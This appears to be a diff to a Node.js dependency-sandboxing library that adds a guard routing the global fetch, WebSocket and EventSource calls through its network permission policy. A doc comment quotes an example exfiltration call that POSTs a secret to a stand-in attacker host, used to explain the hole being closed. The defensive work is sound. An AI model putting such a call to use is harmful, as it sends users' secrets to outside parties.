@@ -20,6 +20,10 @@ import { patchRequire, type RequirePatchHandle } from "./loader/require.js";
 import { registerEsmHook, type EsmHookHandle } from "./loader/esm-hook.js";
 import { installNativeGate, type NativeGateHandle } from "./loader/native.js";
 import { installEnvGuard, type EnvGuardHandle } from "./shims/env.js";
+import {
+  installGlobalEgressGuard,
+  type GlobalEgressGuardHandle,
+} from "./shims/global-egress.js";
 import { resolveMaxFrames } from "./attribution/index.js";
 import type { ShimContext } from "./shims/runtime.js";
 import type { Decision } from "./policy/evaluate.js";
@@ -55,6 +59,18 @@ export interface InstallOptions {
    * (e.g. if the Proxy overhead is a concern for a workload that reads env in a hot loop).
    */
   env?: boolean;
+  /**
+   * Mediate Node's GLOBAL egress APIs — `globalThis.fetch`, `WebSocket`, `EventSource` — against
+   * the same `net` grant the module surfaces use (issue #80). On by default.
+   *
+   * These are globals, not module exports, so the loader interception never sees them: before
+   * this existed, `fetch("https://attacker/", {method:"POST", body:secret})` from a dependency
+   * succeeded under a deny-all `enforce` policy with NO decision recorded. Closing it means
+   * writing to `globalThis`, which affects the app and every package at once — set `false` to
+   * leave the globals untouched if that write is unacceptable in your process. `uninstall()`
+   * always restores the originals; see `shims/global-egress.ts`.
+   */
+  globalEgress?: boolean;
   /** Tuning for the stack-walk attribution step. */
   attribution?: {
     /**
@@ -118,7 +134,7 @@ export function install(
   const hardened = options.hardened === true;
   const ctx: ShimContext = { policy, mode, onDecision, projectRoot, maxFrames, hardened };
   const handles: Array<
-    RequirePatchHandle | EsmHookHandle | EnvGuardHandle | NativeGateHandle
+    RequirePatchHandle | EsmHookHandle | EnvGuardHandle | NativeGateHandle | GlobalEgressGuardHandle
   > = [];
   handles.push(patchRequire(policy, mode, { onDecision, projectRoot, maxFrames, hardened }));
   // Native (`.node`) addon gate (roadmap S2, #49). Always on, and deliberately not routed
@@ -128,6 +144,11 @@ export function install(
   handles.push(installNativeGate(ctx));
   if (options.env !== false) {
     handles.push(installEnvGuard(ctx));
+  }
+  // Global egress (#80). Not import-routed — `fetch`/`WebSocket`/`EventSource` are globals, so
+  // like the env guard this is installed here rather than through the shim registry.
+  if (options.globalEgress !== false) {
+    handles.push(installGlobalEgressGuard(ctx));
   }
   if (options.esm) {
     handles.push(registerEsmHook(ctx));
